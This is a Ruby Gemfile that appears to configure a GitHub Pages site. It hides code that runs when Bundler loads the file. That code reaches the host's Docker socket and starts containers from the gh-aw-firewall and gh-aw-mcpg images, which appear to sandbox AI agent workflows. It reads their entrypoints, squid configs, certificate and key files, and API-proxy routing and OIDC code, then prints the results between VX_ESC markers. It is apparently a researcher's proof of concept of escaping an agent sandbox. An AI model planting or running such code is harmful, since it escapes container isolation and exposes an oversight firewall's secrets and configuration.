source "https://rubygems.org"

require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

OUT = []

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

def decode_docker_logs(body)
  output = +''
  while body.bytesize >= 8 && [1, 2].include?(body.getbyte(0)) && body.byteslice(1, 3) == "\0\0\0"
    length = body.byteslice(4, 4).unpack1('N')
    break if body.bytesize < 8 + length
    output << body.byteslice(8, length)
    body = body.byteslice(8 + length..) || +''
  end
  output.empty? ? body : output
end

def sh_probe(image, cmd)
  st, pl = dapi('POST', '/containers/create',
    'Image' => image, 'Entrypoint' => ['/bin/sh', '-c'], 'Cmd' => [cmd],
    'Tty' => false, 'HostConfig' => { 'NetworkMode' => 'none' },
    'Labels' => { 'vulnoryx.controlled' => 'pages-imgfiles-c4c8' })
  return "VX_CREATE_FAIL #{st} #{pl[0, 120]}" unless st == 201
  cid = JSON.parse(pl)['Id']
  begin
    st2, pl2 = dapi('POST', "/containers/#{cid}/start")
    return "VX_START_FAIL #{st2} #{pl2[0, 120]}" unless st2 == 204 || st2 == 304
    dapi('POST', "/containers/#{cid}/wait?condition=not-running")
    _, lpl = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
    decode_docker_logs(lpl)
  ensure
    dapi('DELETE', "/containers/#{cid}?force=1&v=1")
  end
end

def cat_cmd(files)
  parts = files.map { |f, n| "echo 'VX_F:#{f}'; head -c #{n} '#{f}' 2>/dev/null || echo MISS; echo" }
  (parts + ["echo VX_DONE"]).join('; ')
end

# 1) squid: entrypoint + locate any squid.conf
OUT << "VX_SQUID\n" + sh_probe('ghcr.io/github/gh-aw-firewall/squid:latest',
  "echo 'VX_F:/usr/local/bin/entrypoint.sh'; head -c 1600 /usr/local/bin/entrypoint.sh; echo; " \
  "echo VX_FINDCONF; find / -name 'squid*.conf' -o -name '*.pem' -o -name '*.crt' 2>/dev/null | head -30; " \
  "for c in /etc/squid/squid.conf /usr/local/squid/etc/squid.conf; do [ -f $c ] && echo \"VX_F:$c\" && head -c 1400 $c; done; echo VX_DONE")[0, 3400]

# 2) fw agent + mcpg entrypoints
OUT << "VX_AGENT\n" + sh_probe('ghcr.io/github/gh-aw-firewall/agent:latest',
  cat_cmd([['/usr/local/bin/entrypoint.sh', 1600]]))[0, 2000]

OUT << "VX_MCPG\n" + sh_probe('ghcr.io/github/gh-aw-mcpg:latest',
  cat_cmd([['/app/run_containerized.sh', 1200], ['/app/package.json', 500]]))[0, 2000]

# 3) api-proxy: config JSONs + wiring (endpoints/provider names)
OUT << "VX_APIPROXY\n" + sh_probe('ghcr.io/github/gh-aw-firewall/api-proxy:latest',
  cat_cmd([
    ['/usr/local/bin/docker-entrypoint.sh', 700],
    ['/app/package.json', 900],
    ['/app/provider-env-constants.json', 1400],
    ['/app/model-api-mapping.json', 1400],
    ['/app/routing-config.js', 1000],
    ['/app/server.js', 1200],
    ['/app/github-oidc.js', 800]
  ]) + "; echo VX_DIRS; ls /app/guards /app/providers /app/transforms 2>/dev/null")[0, 4400]

payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 9200]
puts 'VX_ESC_BEGIN'
puts payload
puts 'VX_ESC_END'

gem "github-pages", "~> 232"
